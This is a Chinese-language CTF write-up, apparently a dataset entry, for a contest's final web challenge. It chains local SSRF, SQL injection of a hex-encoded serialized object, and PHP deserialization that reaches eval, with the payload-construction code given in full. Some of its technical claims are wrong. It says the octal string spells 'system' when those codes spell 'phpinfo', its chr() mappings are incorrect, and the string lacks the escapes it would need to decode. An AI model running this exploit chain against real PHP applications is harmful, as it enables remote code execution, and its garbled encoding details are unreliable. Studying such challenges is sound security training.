---
title: 极客少年挑战赛2025决赛的最后一题
contest: 极客少年挑战赛2025决赛
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [SQL注入, PHP反序列化, WAF绕过, 进制转换字符串, Expression类__wakeup, REMOTE_ADDR SSRF, hex编码]
attack_chain: index.php SSRF→sql.php?action=add入库→action=query取出→unserialize触发Expression.__wakeup→eval($this->expression)→进制转换字符串绕字母黑名单
key_payload: "filter: select|update|from|insert|delete|union|order|and|or|'|\"|\\\\;preg_match('/a-z/im', $this->expression);hex编码反序列化串;($_=\"160150160151156146157\")() 进制转字符串"
one_liner: 极客少年挑战赛2025决赛Web：SSRF+SQL注入+PHP反序列化触发eval+进制转换字符串绕字母
lesson: REMOTE_ADDR==127.0.0.1本地SSRF+hex编码反序列化串+八进制字符串绕字母黑名单
quality: high
---

# 极客少年挑战赛2025决赛的最后一题

**赛事**：极客少年挑战赛2025决赛（最后一题Web综合）

**题目代码关键点**：

**index.php**:
- WAF过滤 `select|update|from|insert|delete|union|order|and|or|'|"|\\`（`/im` 模式）
- `switch($_GET['action'])`：
  - `case '1'`: SSRF请求 `127.0.0.1/sql.php?action=add&value=...`
  - `case '2'`: SSRF请求 `127.0.0.1/sql.php?action=query&value=...` → JSON返回 → 若serialized=true → unserialize → 取expression/value

**sql.php**:
- 验证 `$_SERVER['REMOTE_ADDR'] === '127.0.0.1'`
- 同WAF过滤（`REQUEST_URI`）
- `add`：`INSERT INTO contents (serialized, value) VALUES (0, '".$_GET['value']."')`
- `query`：`SELECT * FROM contents WHERE id = intval($_GET['value'])` → json_encode返回

**Expression类**:
```php
class Expression {
    public $expression;
    public $value;
    function __wakeup() {
        if(preg_match('/a-z/im', $this->expression)) {
            $this->expression = 'die("Hacker!");';
        }
        $this->value = eval('return '.$this->expression.';');
    }
    function __toString() { return $this->value; }
}
```

**Payload构造**：
```php
$data = new Expression();
$data->expression = '($_="160150160151156146157")();';  // 八进制字符串转"system"
$data->value = '1';
$s = serialize($data);
$hex = bin2hex($s);
$payload = "a'),(1,0x{$hex}";  // SQL注入插入hex编码的反序列化串
$param = urlencode(urlencode($payload));
```

**关键技术**：
- REMOTE_ADDR验证必须从本地SSRF
- WAF过滤 `'` `"` `\` 用 hex编码绕过
- 字母过滤用八进制字符串（chr(160)=a, 150=n 等）
- `intval` 用作id定位
- bin2hex + 0x前缀绕过SQL注入过滤

**其他题目**：
- PWN：简单溢出，泄露puts地址后计算libc
- PHP混淆：eval换print直接打印flag
- Word zip解压搜.cn关键词

**质量评估**：高（payload具体 + Expression类利用链完整）
